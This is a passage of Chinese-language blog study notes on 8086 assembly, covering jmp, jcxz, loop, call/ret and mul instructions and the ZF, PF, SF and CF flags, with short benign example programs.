class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg<br>codesg segment<br>  start:mov ax,offset start//相当于mov ax,0<br>  s:mov ax,offset s//相当于mov ax,3<br>codesg ends<br>end start<br>//start所标记的指令是代码段的第一条指令，偏移地址为0<br>//s所标记的指令为第二条，第一条指令长度为3个字节，则s的偏移地址为3<br></code></pre></td></tr></table></figure><p>e.g 使程序在运行中将 s 处的一条指令复制到 s0 处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">//将s处的指令复制到s0处就是将cs:offset s处数据复制到cs:offset s0<br><br>assume cs:codesg<br>codesg segment<br>s:mov ax,bx//mov ax,bx的机器码占2个字节<br>mov si,offset s<br>mov di,offset s0<br>mov ax,cs:[si]<br>mov cs:[di],ax<br>s0:nop//nop占一个字节<br>nop<br>codesg ends<br>end s<br></code></pre></td></tr></table></figure><h3 id="9-2-jmp-指令"><a href="#9-2-jmp-指令" class="headerlink" title="9.2 jmp 指令"></a>9.2 jmp 指令</h3><p>无条件转移指令</p><p>jmp 指令要给出两种信息：</p><ul><li>转移的目的地址</li><li>转移的距离（段间转移、段内短转移、段内近转移）</li></ul><h3 id="9-3-根据位移进行转移的-jmp-指令"><a href="#9-3-根据位移进行转移的-jmp-指令" class="headerlink" title="9.3 根据位移进行转移的 jmp 指令"></a>9.3 根据位移进行转移的 jmp 指令</h3><ul><li><p>jmp short 标号（转到标号处执行指令）&#x2F;&#x2F;段内短转移</p></li><li><p>CPU 在执行 jmp 指令时不需要转移的目的地址</p></li><li><p><strong>“jmp short 标号”:功能：(IP)&#x3D;(IP)+8 位位移</strong></p><ul><li>8位位移&#x3D;标号处的地址-jmp 指令后的第一个字节的地址</li><li>short 指明此处的位移为8位位移</li><li>8位位移范围为-128~127，用补码表示</li><li>8位位移由编译程序在编译时算出</li></ul></li><li><p><strong>“jmp near ptr  标号”:(IP)&#x3D;(IP)+16 位位移</strong></p><ul><li>16位位移&#x3D;标号处的地址-jmp指令的第一个字节的地址</li><li>near ptr 指明此处的位移为16位位移，进行的是段内近转移</li><li>16位位移的范围为-32768~32767，用补码表示</li><li>16位位移由编译程序在编译时算出</li></ul></li></ul><h3 id="9-4-转移的目的地址在指令中的-jmp-指令"><a href="#9-4-转移的目的地址在指令中的-jmp-指令" class="headerlink" title="9.4 转移的目的地址在指令中的 jmp 指令"></a>9.4 转移的目的地址在指令中的 jmp 指令</h3><p>“jmp  far  ptr  标号”实现<strong>段间转移，又称为远转移</strong>**</p><ul><li>(CS)&#x3D;标号所在段的段地址；</li><li>(IP)&#x3D;标号在段中的偏移地址</li><li>far ptr 指明了指令用标号的段地址和偏移地址修改 CS 和 IP</li></ul><h3 id="9-5-转移地址在寄存器中的-jmp-指令"><a href="#9-5-转移地址在寄存器中的-jmp-指令" class="headerlink" title="9.5 转移地址在寄存器中的 jmp 指令"></a>9.5 转移地址在寄存器中的 jmp 指令</h3><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp 16位reg<br></code></pre></td></tr></table></figure><p>功能：(IP)&#x3D;（16位reg）</p><h3 id="9-6-转移地址在内存中的-jmp-指令"><a href="#9-6-转移地址在内存中的-jmp-指令" class="headerlink" title="9.6 转移地址在内存中的 jmp 指令"></a>9.6 转移地址在内存中的 jmp 指令</h3><p>1）<strong>jmp  word  ptr   内存单元地址（段内转移）</strong></p><ul><li><p>从内存单元地址处开始存放一个字，是转移的目的偏移地址</p></li><li><p>内存单元地址可用寻址方式的任一格式给出</p></li><li><pre><code class="assembly">mov ax,0123Hmov ds:[0],axjmp word ptr ds:[0]//执行后(IP)=0123Hmov ax,0123Hmov [bx],axjmp word ptr [bx]//执行后(IP)=0123H<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><br><br><span class="hljs-number">2</span>）**<span class="hljs-keyword">jmp</span>  <span class="hljs-built_in">dword</span>  <span class="hljs-built_in">ptr</span>  内存单元地址（段间转移）**<br><br>- 从内存单元开始存放两个字，**高地址处的字是转移的目的段地址，低地址是偏移地址**<br><br>- (<span class="hljs-built_in">CS</span>)=(内存单元地址+<span class="hljs-number">2</span>)<br><br>  （<span class="hljs-built_in">IP</span>）=（内存单元地址）<br><br>- <span class="hljs-string">```</span>assembly<br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0123H</span><br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>:[<span class="hljs-number">0</span>],<span class="hljs-built_in">ax</span><br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[<span class="hljs-number">2</span>],<span class="hljs-number">0</span><br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[<span class="hljs-number">0</span>]<br>  //执行后(<span class="hljs-built_in">CS</span>)=<span class="hljs-number">0</span>,(<span class="hljs-built_in">IP</span>)=<span class="hljs-number">0123H</span>,<span class="hljs-built_in">CS</span>:<span class="hljs-built_in">IP</span>指向<span class="hljs-number">0000</span>:<span class="hljs-number">0123</span><br>  <br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0123H</span><br>  <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">bx</span>],<span class="hljs-built_in">ax</span><br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">bx</span>+<span class="hljs-number">2</span>],<span class="hljs-number">0</span><br>  <span class="hljs-keyword">jmp</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">bx</span>]<br>  //执行后，(<span class="hljs-built_in">CS</span>)=<span class="hljs-number">0</span>,(<span class="hljs-built_in">IP</span>)=<span class="hljs-number">0123H</span>,<span class="hljs-built_in">CS</span>:<span class="hljs-built_in">IP</span>指向<span class="hljs-number">0000</span>:<span class="hljs-number">0123</span><br></code></pre></td></tr></table></figure></code></pre></li></ul><p>e.g. 使 jmp 指令执行后，CS:IP 指向程序的第一条指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>data segment<br>dd12345678H<br>data ends<br>code segment<br> start:mov ax,data<br> mov ds,ax<br> mov bx,0<br> mov [bx],bx//或者 mov [bx],word ptr 0或者mov [bx],offset start<br> //将IP设置为0<br> mov [bx+2],cs//或 mov [bx+2],cs   或 mov [bx+2],seg code<br> //将cs段地址放入内存单元<br> jmp dword ptr ds:[0]<br>code ends<br>end start<br>//jmp dword ptr ds:[0]为段间转移,(CS)=(内存单元地址+2),(IP)=(内存单元地址)<br>//CS:IP指向第一条指令,第一条程序地址为cs:0,设置CS:IP指向cs:0<br></code></pre></td></tr></table></figure><p>e.g 2000:1000  BE  00  06  00  00  00 ……</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,2000H<br>mov es,ax<br>jmp dword ptr es:[1000H]<br>//(CS)=0006H,(IP)=00BEH<br></code></pre></td></tr></table></figure><h3 id="9-7-jcxz-指令"><a href="#9-7-jcxz-指令" class="headerlink" title="9.7 jcxz 指令"></a>9.7 jcxz 指令</h3><p>jcxz 指令为有<strong>条件转移指令，都是短转移</strong>，在对应的机器码中包含转移的位移，而不是目的地址。IP修改范围为:-128~127</p><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jcxz  标号(如果(cx)=0),转移到标号处执行<br>当(cx)=0时,(IP)=(IP)+8位位移<br></code></pre></td></tr></table></figure><ul><li>8位位移&#x3D;标号处的地址 - jcxz 指令后的第一个字节的地址</li><li>8位位移的范围为-128~127，用补码表示</li></ul><p>“ jcxz  标号 ”功能相当于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">if ((cx)==0) <br>jmp short 标号<br></code></pre></td></tr></table></figure><p>e.g 利用 jcxz 指令，实现在内存 2000H 段中查找第一个值为 0 的字节，找到后将它的偏移地址存储在 dx 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br> start:mov ax,2000H<br> mov ds,ax<br> <br> mov bx,0<br> s:mov ch,0//将ch寄存器清零。ch寄存器被用作辅助寄存器，cx寄存器由ch和cl组成，用于循环计数<br> mov cl,[bx]//将bx指向的内存地址的内容送入cl中<br> jcxz ok//if(cx==0),就是ch和cl为0<br> inc bx<br> jmp short s<br> <br> ok:mov dx,bx<br> mov ax,4c00h<br> int 21h<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="9-8-loop-指令"><a href="#9-8-loop-指令" class="headerlink" title="9.8 loop 指令"></a>9.8 loop 指令</h3><p>loop 指令为循环指令，<strong>所有循环指令都是短转移</strong></p><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">loop 标号 (cx)=(cx)-1,如果(cx)不为0，转移到标号处执行、<br>即：<br>(cx)=(cx)-1<br>如果(cx)不为0,(IP)=(IP)+8位位移<br></code></pre></td></tr></table></figure><ul><li>8位位移&#x3D;标号处地址 - loop 指令后的第一个字节的地址</li><li>8位位移的范围为-128~127，用补码表示</li></ul><p>“ loop ”相当于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(cx)--<br>if(cx)!=0)<br>jmp short 标号<br></code></pre></td></tr></table></figure><p>e.g 利用 loop 指令，实现在内存 2000H 段中查找第一个值为 0 的字节，将偏移地址存储在 dx 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br> start:mov ax,2000H<br> mov ds,ax<br> mov bx,0<br> s:mov cl,[bx]<br> mov ch,0<br> inc cx<br> inc bx<br> loop s<br> ok:dec bx<br> mov dx,bx//dec和inc相反，dec bx进行操作为:(bx)=(bx)-1<br> mov ax,4c00h<br> int 21h<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h1 id="十、CALL和RET指令"><a href="#十、CALL和RET指令" class="headerlink" title="十、CALL和RET指令"></a>十、CALL和RET指令</h1><h3 id="10-1-ret-和-retf"><a href="#10-1-ret-和-retf" class="headerlink" title="10.1 ret 和 retf"></a>10.1 ret 和 retf</h3><p>ret 指令用栈中的数据，修改 IP 的内容，从而实现转移</p><p>retf 修改 CS 和 IP 的内容，实现转移</p><p>执行 ret 指令时 : 相当于进行：pop  IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(IP)=((ss)*16+(sp))<br>(sp)=(sp)+2<br></code></pre></td></tr></table></figure><p>执行 retf 指令时：相当于进行：pop  IPpop  CS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(IP)=((ss)*16+(sp))<br>(sp)=(sp)+2<br>(CS)=((ss)*16+(sp))<br>(sp)=(sp)+2<br></code></pre></td></tr></table></figure><p>ret 指令执行后，(IP)&#x3D;0,CS:IP 指向代码段的第一条指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>stack segment<br>db 16 dup (0)<br>stack ends<br>code segment<br>mov ax,4c00h<br>int 21h<br> start:mov ax,stack<br> mov ss,ax<br> mov sp,16<br> mov ax,0<br> push ax<br> mov bx,0<br> ret<br>code ends<br>end start<br></code></pre></td></tr></table></figure><p>retf 指令执行后，CS:IP 指向代码段的第一条命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>stack segment<br>db 16 dup (0)<br>stack ends<br>code segment<br>mov ax,4c00h<br>int 21h<br> start:mov ax,stack<br> mov ss,ax<br> mov sp,16<br> mov ax,0<br> push cs<br> push ax<br> mov bx,0<br> retf<br>code ends<br>end start<br></code></pre></td></tr></table></figure><p>e.g 实现从内存 1000:0000 处开始执行指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>stack segment<br>db 16 dup (0)<br>stack ends<br>code segment<br> start:mov ax,stack<br> mov ss,ax<br> mov sp,16<br> mov ax,1000h<br> push ax<br> mov ax,0<br> push ax<br> retf<br>code ends<br>end start<br>//先将段地址CS入栈,再将偏移地址IP入栈<br></code></pre></td></tr></table></figure><h3 id="10-3-根据位移进行转移的-call-指令"><a href="#10-3-根据位移进行转移的-call-指令" class="headerlink" title="10.3 根据位移进行转移的 call 指令"></a>10.3 根据位移进行转移的 call 指令</h3><p>CPU 执行 call 指令时，进行：</p><ul><li>将当前 IP 或 CS 和 IP 压入栈中</li><li>转移</li></ul><p><strong>call   标号(将当前 IP 压栈后，转到标号处执行指令)</strong></p><p>执行 call 指令时，进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">1) (sp)=(sp)-2<br>((ss)*16+(sp))=(IP)<br>2) (IP)=(IP)+16位位移<br></code></pre></td></tr></table></figure><ul><li>16位位移 &#x3D; 标号处的地址 - call 指令后的第一个字节的地址</li><li>16位位移的范围为-32768~32767</li></ul><p>执行 “ call   标号 “时，相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push IP<br>jmp near ptr 标号<br></code></pre></td></tr></table></figure><h3 id="10-4-转移的目的地址在指令中的-call-指令"><a href="#10-4-转移的目的地址在指令中的-call-指令" class="headerlink" title="10.4 转移的目的地址在指令中的 call 指令"></a>10.4 转移的目的地址在指令中的 call 指令</h3><p>” call  far  ptr  标号 “ 实现段间转移</p><p>执行时：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">1) (sp)=(sp)-2<br>((ss)*16+(sp))=(CS)<br>(sp)=(sp)-2<br>((ss)*16+(sp))=(IP)<br>2) (CS)=标号所在段的段地址<br>(IP)=标号在段中的偏移地址<br></code></pre></td></tr></table></figure><p>执行” call  far  ptr  标号 “时，相当于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push CS<br>push IP<br>jmp far ptr 标号<br></code></pre></td></tr></table></figure><h3 id="10-5-转移地址在寄存器中的-call-指令"><a href="#10-5-转移地址在寄存器中的-call-指令" class="headerlink" title="10.5 转移地址在寄存器中的 call 指令"></a>10.5 转移地址在寄存器中的 call 指令</h3><p>格式：call 16位 reg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(sp)=(sp)-2<br>((ss)*16+(sp))=(IP)<br>(IP)=(16位reg)<br><br>//相当于<br>push IP<br>jmp 16位reg<br></code></pre></td></tr></table></figure><h3 id="10-6-转移地址在内存中的-call-指令"><a href="#10-6-转移地址在内存中的-call-指令" class="headerlink" title="10.6 转移地址在内存中的 call 指令"></a>10.6 转移地址在内存中的 call 指令</h3><p><strong>1） call  word  ptr 内存单元地址</strong></p><p>​相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push IP<br>jmp word ptr 内存单元地址<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov sp,10h<br>mov ax,0123h<br>mov ds:[0],ax<br>call word ptr ds:[0]<br>//(IP)=0123H,(sp)=0EH<br></code></pre></td></tr></table></figure><p><strong>2) call  dword  ptr  内存单元地址</strong></p><p>​相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push CS<br>push IP<br>jmp dword ptr 内存单元地址<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov sp,10h<br>mov ax,0123h<br>mov ds:[0],ax<br>mov word ptr ds:[2],0<br>call dword ptr ds:[0]//进行两次压栈操作，sp-2-2<br>//(CS)=0,(IP)=0123H,(sp)=0CH<br></code></pre></td></tr></table></figure><p>e.g 下面程序执行后，ax 和 bx 值为多少</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>data segment<br>dw 8 dup (0)<br>data ends<br>code segment<br> start:mov ax,data//3字节<br> mov ss,ax//2字节<br> mov sp,16//3字节<br> mov word ptr ss:[0],offset s//7字节<br> //(ss:[0]=1ah)<br> <br> mov ss:[2],cs//4字节<br> //(ss:[2])=cs<br> <br> call dword ptr ss:[0]//7字节<br> //cs入栈,ip=19h入栈，转到cs:1ah处执行指令，(ss:[4])=cs,(ss:[6])=ip<br> <br> nop<br> s:mov ax,offset s//ax=1ah<br> sub ax,ss:[0cH]<br> //ax=1ah-(ss:[0ch])=1ah-19h=1<br> <br> mov bx,cs//bx=cs=0c5bh<br> sub bx,ss:[0eH]//bx=cs-cs=0<br> mov ax,4c00h<br> int 21h<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="10-7-call-和-ret-的配合使用"><a href="#10-7-call-和-ret-的配合使用" class="headerlink" title="10.7 call 和 ret 的配合使用"></a>10.7 call 和 ret 的配合使用</h3><p>e.g bx 的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br> start:mov ax,1<br> mov cx,3<br> call s//IP指向下一条指令，并压栈，将IP的值改变为标号为s处的偏移地址<br> <br> mov bx,ax<br> <br> mov ax,4c00h<br> int 21h<br> s:add ax,ax<br> loop s//ax=8<br> ret//前压入的指令偏移地址送入IP中。CS:IP指向指令mov bx,ax，从此开始执行命令。bx=8<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="10-8-mul-指令"><a href="#10-8-mul-指令" class="headerlink" title="10.8 mul 指令"></a>10.8 mul 指令</h3><ul><li><p>mul 是乘法指令</p></li><li><p>两个相乘的数位要一样，<strong>8位默认放在 AL</strong> 中，另一个放在8位 reg 或内存字节单元中；<strong>16位放在AX中</strong>，另一个放在16位 reg 或内存字单元中。</p></li><li><p>8位乘法，结果默认放在 AX 中；16位，结果高位默认在 DX 中，低位 AX 中。</p></li></ul><p>格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mul reg<br>mul 内存单元<br></code></pre></td></tr></table></figure><p>内存单元可以用不同的寻址方式给出，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mul byte ptr ds:[0]<br>//(ax)=(al)*((ds)*16+0)<br><br>mul word ptr [bx+si+8]<br>//(ax)=(ax)*((ds)*16+(bx)+(si)+8)结果的低16位<br>//(dx)=(ax)*((ds)*16+(bx)+(si)+8)结果的低16位<br></code></pre></td></tr></table></figure><p>e.g 计算 100 * 10</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,100<br>mov bl,10<br>mul bl<br>//(ax)=1000(03E8H)<br></code></pre></td></tr></table></figure><p>​计算 100 * 10000</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,100<br>mov bx,10000<br>mul bx<br>//(ax)=4240H,(dx)=000FH<br></code></pre></td></tr></table></figure><h3 id="10-10-参数和结果传递的问题"><a href="#10-10-参数和结果传递的问题" class="headerlink" title="10.10 参数和结果传递的问题"></a>10.10 参数和结果传递的问题</h3><p>e.g 计算 data 段中第一组数据的 3 次方，结果保存在后面一组 dword 单元中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br> data segment<br> dw 1,2,3,4,5,6,7,8<br> dd 0,0,0,0,0,0,0,0<br> data ends<br> code segment<br> start:mov ax,data<br> mov ds,ax<br> mov si,0//ds:si 指向第一组 word 单元<br> mov di,16//ds:si 指向第二组 dword 单元<br> <br> mov cx,8<br> s:mov bx,[si]<br> call cube<br> mov [di],ax<br> mov [di].2,dx<br> add si,2//ds:si 指向下一个 word 单元<br> add di,4//ds:si 指向下一个 dword 单元<br> loop s<br> <br> mov ax,4c00h<br> int 21h<br> cube:mov ax,bx<br> mul bx<br> mul bx<br> ret<br> code ends<br>end start<br></code></pre></td></tr></table></figure><h1 id="十一、标志寄存器"><a href="#十一、标志寄存器" class="headerlink" title="十一、标志寄存器"></a>十一、标志寄存器</h1><p>标志寄存器 flag 按位起作用</p><p><img src="https://img.dkdun.cn/v1/2025/12/b4e62b03ac53ddf3.png"></p><h3 id="11-1-ZF-标志"><a href="#11-1-ZF-标志" class="headerlink" title="11.1 ZF 标志"></a>11.1 ZF 标志</h3><p>flag 的第 6 位是 ZF ，零标志位。如果执行相关指令后，结果为 0，zf &#x3D; 1;不为 0，zf &#x3D;0</p><h3 id="11-2-PF标志"><a href="#11-2-PF标志" class="headerlink" title="11.2 PF标志"></a>11.2 PF标志</h3><p>flag 第 2 位是 PF，奇偶标志位。记录相关指令执行后，结果的所有 bit 位中1的个数是否为偶数，如果是偶数，pf &#x3D; 1，如果是奇数，pf &#x3D; 0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,1<br>add al,10<br>//00001011B，3个1，pf=0<br>mov al,1<br>or al,2<br>//执行后，结果为 00000011B，有 2 个1，pf=1<br>sub al,al<br>// 00000000B,0个偶数，pf=1<br></code></pre></td></tr></table></figure><h3 id="11-3-SF-标志"><a href="#11-3-SF-标志" class="headerlink" title="11.3 SF 标志"></a>11.3 SF 标志</h3><p>flag 第7位，符号标志位。记录执行指令后，结果是否为负。结果为负，sf &#x3D;1；如果非负，sf &#x3D;0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sub al,al ZF=1  PF=1  SF=0<br>mov al,1110<br>push ax110<br>pop bx110<br>//mov,push,pop等传送指令对标志寄存器没影响<br>add al,bl000<br>add al,10010<br>mul al010<br></code></pre></td></tr></table></figure><h3 id="11-4-CF-标志"><a href="#11-4-CF-标志" class="headerlink" title="11.4 CF 标志"></a>11.4 CF 标志</h3><p>flag 第 0 位是 CF，进位标志位。一般情况下，在进行无符号运算时，记录了运算结果的最高有效位向跟高位的进位值，或从更高位的借位值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,98H<br>add 